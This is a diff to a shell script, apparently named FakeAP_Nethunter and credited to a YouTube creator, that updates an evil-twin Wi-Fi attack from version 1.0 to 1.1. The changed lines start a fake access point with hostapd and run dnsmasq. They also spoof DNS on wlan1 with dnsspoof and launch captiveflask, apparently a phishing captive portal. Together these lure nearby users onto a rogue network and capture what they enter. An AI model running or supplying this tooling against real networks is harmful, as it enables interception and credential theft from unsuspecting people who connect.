@@ -14,7 +14,7 @@ cat << EOF
  ::   ::  :::     ::     :: ::::  ::   :::   ::: :::  ::   :::  
 :     :   :::     :     : :: ::    :   : :   :: :: :   :   : :  
                                                                 
-                                    Version : 1.0
+                                    Version : 1.1
                                  Created By : Ikteach
                                     YouTube : @ikteachoffical                 
 
@@ -60,9 +60,9 @@ ip rule add from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2> /dev/
 ip rule add from all iif lo oif wlan0 lookup $table pref 17000 2> /dev/null
 ip rule add from all iif lo oif wlan1 lookup 97 pref 17000 2> /dev/null
 ip rule add from all iif wlan1 lookup $table pref 21000 2> /dev/null
-echo "Starting captiveflask and hostapd.conf..."
-sleep 20 && cd /eviltwin & sudo hostapd /eviltwin/hostapd.conf &
+echo "Starting fake access point setup..."
+sleep 20 && cd /FakeAP_Nethunter & sudo hostapd hostapd.conf &
 sleep 5
-sudo dnsmasq -C dnsmasq.conf -d &
+sudo dnsmasq -C /FakeAP_Nethunter/dnsmasq.conf -d &
 sleep 5
-sudo dnsspoof -i wlan1
+sudo dnsspoof -i wlan1 & sudo captiveflask -t $(pwd) -s $(pwd)/static -r 10.0.0.1 -f true
